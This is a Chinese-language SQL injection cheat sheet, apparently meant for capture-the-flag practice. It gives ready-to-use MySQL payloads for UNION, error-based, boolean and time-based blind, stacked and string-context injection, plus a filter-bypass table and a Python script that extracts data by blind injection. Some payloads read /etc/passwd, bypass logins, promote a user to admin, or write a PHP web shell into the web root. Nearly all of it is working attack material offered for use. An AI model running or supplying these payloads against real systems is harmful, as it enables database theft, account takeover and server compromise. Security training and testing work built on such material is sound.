# SQL 注入速查（照着做就能把题做完）

> 用法：做题不记得了 → 翻到对应知识点 → 照着 payload 改表名/列名即可
> 每个知识点都是完整流程：怎么做 → 每步给 payload → 预期输出 → 坑

========================================================
## 0. 拿到题先走这个流程
========================================================

```
1. 读源码：找 $_GET/$_POST 拼进 SQL 的位置 → 判断数字注入（无引号）还是字符串注入（有引号）
2. 确认注入存在：
   - 数字注入：1 and 1=1（正常） vs 1 and 1=2（无结果）
   - 字符串注入：输入一个单引号 ' 看是否报错
3. 看页面有没有回显：
   - 能显示查询结果 → UNION 注入 或 报错注入
   - 只显示'查到/没查到' → 布尔盲注
   - 页面完全不变 → 时间盲注
4. 枚举：库名 → 表名 → 列名 → 数据
5. 被过滤 → 看对应知识点里的'绕过'部分
```

---

========================================================
## 1. UNION 注入（有回显时用）
========================================================

**前提**：页面能显示查询结果，注入点是数字（无引号）

**完整流程（7步）**：

```sql
-- ① 数列数：order by 从 1 试到报错
1 order by 1    -- 正常
1 order by 2    -- 正常
1 order by 3    -- 报错 Unknown column '3' → 说明只有 2 列！

-- ② 探位置：union select 数字，看页面上出现哪个
0 union select 1,2     -- 页面出现 1 和 2 的位置 = 可用列

-- ③ 查库名
0 union select database(),2

-- ④ 查表名（注意 where table_schema=database() 限定当前库）
0 union select table_name,2 from information_schema.tables where table_schema=database()

-- ⑤ 查列名
0 union select column_name,2 from information_schema.columns where table_schema=database() and table_name='找到的表名'

-- ⑥ 查数据
0 union select 列名,2 from 表名

-- ⑦ 读文件（有 FILE 权限时）
0 union select load_file('/etc/passwd'),2
```

**坑**：
- union 前后列数必须一致（数错就报错）
- id=0 是为了让前面查不到行，只显示 union 的结果
- 枚举忘记 table_schema=database() 会列出所有库的表（很乱）

---

========================================================
## 2. 报错注入（页面显示数据库报错时用）
========================================================

**前提**：页面会显示数据库报错信息（源码里有 mysqli_error 之类）

**完整流程（查表→查列→查数据→超长处理）**：

```sql
-- ① 查表名（多行必须 group_concat 合并成一行！）
1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))
→ 报错显示：XPATH syntax error: '~products,secret_table'

-- ② 查列名
1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_table')))
→ 报错显示：XPATH syntax error: '~id,data'

-- ③ 查数据
1 and extractvalue(1,concat(0x7e,(select data from secret_table)))
→ 报错显示：XPATH syntax error: '~flag{...}'

-- ④ 数据太长（报错只显示 32 字符）：用 substr 分段，每段 30 字符
1 and extractvalue(1,concat(0x7e,(select substr(data,1,30) from secret_table)))
1 and extractvalue(1,concat(0x7e,(select substr(data,31,30) from secret_table)))
→ 两段拼起来就是完整 flag
```

**函数选择（updatexml 被禁就换 extractvalue）**：
```sql
extractvalue(1,concat(0x7e,(select ...)))        -- 2 个参数
updatexml(1,concat(0x7e,(select ...)),1)         -- 3 个参数（多一个）
gtid_subset(concat(0x7e,(select ...)),0x7e)      -- 5.7 专属
```

**坑**：
- extractvalue 是 **2 个参数**；写成 3 个报 Incorrect parameter count
- 0x7e 是波浪号 ~，用来让数据出现在报错开头（读报错找 ~ 后面）
- 子查询必须返回 1 行（多行用 group_concat）

---

========================================================
## 3. 布尔盲注（页面只有'查到/没查到'两种反应）
========================================================

**前提**：页面两种反应不同（如 '查询到了' vs '商品不存在'）

**完整流程**：

```sql
-- ① 确认注入
1 and 1=1    -- 页面正常（查到）
1 and 1=2    -- 页面异常（没查到）

-- ② 量长度（先知道多长，好判断提取完没有）
1 and length((select flag from flag_table))=17

-- ③ 逐字符猜（二分法：问 ascii 是否大于中间值）
1 and ascii(substr((select flag from flag_table),1,1))>100   -- 第1个字符 >100？
1 and ascii(substr((select flag from flag_table),1,1))=102  -- 精确等于？

-- ④ 枚举表名（不知道表名时）
1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100

-- ⑤ 枚举列名
1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1),1,1))>100
```

**40 个字符手猜太慢 → 用脚本（见第 8 节 Python 模板）**

---

========================================================
## 4. 时间盲注（页面完全不变，用响应时间做信号）
========================================================

**前提**：页面永远一样；sleep 不被过滤

**完整流程**：

```sql
-- ① 确认注入
1 and sleep(3)    -- 页面卡 3 秒 = 注入存在

-- ② 条件成立才 sleep（时间盲注的核心句式）
1 and if(ascii(substr((select flag from flag_table),1,1))>100, sleep(1), 0)

-- ③ 量长度
1 and if(length((select flag from flag_table))=17, sleep(1), 0)
```

**脚本见第 8 节**（把布尔版 ask 换成计时版）

---

========================================================
## 5. 堆叠注入（分号能执行多条语句）
========================================================

**前提**：源码用 mysqli_multi_query（或驱动支持多语句）

**完整流程**：

```sql
-- ① 看库表
1;show databases
1;show tables              -- 直接列所有表名

-- ② 看表结构
1;describe secret_table    -- 列名/类型一目了然

-- ③ 查数据
1;select data from secret_table

-- ④ 改数据（提权！）
1;update users set role='admin' where username='guest'

-- ⑤ 写文件 getshell
1;select '<?php system($_GET[1]);?>' into outfile '/var/www/html/shell.php'
```

**坑**：URL 里分号要编码成 %3B

---

========================================================
## 6. 字符串注入（输入被单引号包着）
========================================================

**前提**：源码是 where username='$user' 这种

**完整流程（闭合引号 + 注释掉后面）**：

```sql
admin'#              -- 万能密码：闭合引号，# 注释掉密码检查
' or '1'='1          -- 恒真
admin' or '1'='1'#   -- 闭合+恒真+注释
' union select 1,2#  -- 字符串场景的 union

-- 万能公式：' + 你的SQL + # 或 -- - 或 /*
```

**坑**：注释符 # 在 URL 里要编码成 %23；-- 后面必须跟空格

---

========================================================
## 7. 读文件 / 宽字节 / 绕过
========================================================

### 读文件（LOAD_FILE）

```sql
-- 先查限制目录（读不到基本都是这个原因）
0 union select @@secure_file_priv,2

-- 读文件（三前提：FILE权限 + 路径可读 + secure_file_priv 允许）
0 union select load_file('/var/lib/mysql-files/flag.txt'),2
```

### 宽字节（addslashes + GBK 字符集）

```sql
-- %bf 和转义反斜杠组成汉字，反斜杠被吃 → 引号裸奔
username=%bf%27%20or%201=1%23
```

### 绕过速查（拦什么换什么）

| 被拦 | 换什么 | 例子 |
|------|--------|------|
| 空格 | /**/ | 1/**/union/**/select/**/1,2 |
| 小写关键字 | 大写（过滤没写/i时） | UnIoN SeLeCt |
| union/select 连写 | 关键字中间加注释 | union/**/select |
| 引号 | 十六进制 0x | table_name=0x666c6167 |
| 等号 | like / in / between | where id like 1 |
| sleep 被禁 | benchmark | benchmark(10000000,md5('a')) |
| if 被禁 | case when | case when 条件 then sleep(1) else 0 end |
| substr 被禁 | mid / substring | mid((select...),1,1) |
| 函数被禁 | 换等价 | updatexml→extractvalue |

---

========================================================
## 8. Python 脚本模板（盲注提速）
========================================================

```python
import requests, time

def ask(cond):   # 布尔版：看页面文字
    return '正常时页面有的字' in requests.get(URL + '1/**/and/**/' + cond, timeout=10).text

def ask_time(cond):   # 时间版：看响应耗时
    t0 = time.time()
    try: requests.get(URL + '1 and if(' + cond + ',sleep(1),0)', timeout=10)
    except Exception: pass
    return time.time() - t0 > 0.6

def extract(subq, stop='}'):
    out = ''
    for pos in range(1, 60):
        lo, hi = 32, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if ask('ascii(substr((%s),%d,1))>%d' % (subq, pos, mid)):
                lo = mid + 1
            else: hi = mid
        ch = chr(lo)
        if ch == ' ': break
        out += ch
        if ch == stop: break
    return out

# 用法：
# extract('database()') → 库名
# extract('table_name from information_schema.tables where table_schema=database() limit 0,1') → 表名
# extract('flag from flag_table') → 数据
```

---

========================================================
## 9. 函数一句话速查（不记得哪个函数干什么用）
========================================================

| 函数 | 干什么 | 一句话用法 |
|------|--------|-----------|
| substr(s,p,l) | 截取 | substr('abc',1,2)='ab'；p从1开始，l省略取到结尾 |
| ascii(c) | 字符→数字 | ascii('a')=97；盲注比较用 |
| char(n) | 数字→字符 | char(102)='f'；绕过引号 |
| concat(a,b) | 拼接 | 报错注入拼数据；有NULL结果NULL |
| group_concat(col) | 多行→一行 | 枚举表名列名必用（子查询只能1行） |
| length(s) | 字节数 | 盲注先量长度 |
| hex(s) | 转十六进制 | 绕过引号：0x666c6167='flag' |
| if(c,a,b) | 条件分支 | 时间盲注：if(条件,sleep(1),0) |
| sleep(n) | 卡n秒 | 确认注入 / 时间盲注 |
| database() | 当前库名 | 枚举第一步 |
| version() | 版本 | 决定用哪个报错函数 |
| user() | 当前用户 | 看是不是root |
| load_file(p) | 读文件 | 三前提（FILE权限/路径/secure_file_priv） |
| updatexml | 报错注入 | 3个参数 |
| extractvalue | 报错注入 | 2个参数 |

---

========================================================
## 10. 报错导航（页面报错看不懂时）
========================================================

| 报错 | 意思 | 怎么办 |
|------|------|--------|
| near 'xxx' | 语法错 | 看 xxx 附近 |
| near '' | 括号/引号没闭合 | 数括号 |
| Unknown column 'x' | 列不存在 / order by 超列数 | 枚举列名 / 数列数 |
| Subquery returns more than 1 row | 子查询多行 | 加 group_concat 或 limit 1 |
| Incorrect parameter count | 函数参数个数错 | extractvalue=2参 updatexml=3参 |
| can't open file | 读文件被拒 | 查 @@secure_file_priv |

---

## 心法

> 先读源码 ｜ 报错是导航 ｜ 拦什么换什么 ｜ 盲注就写脚本
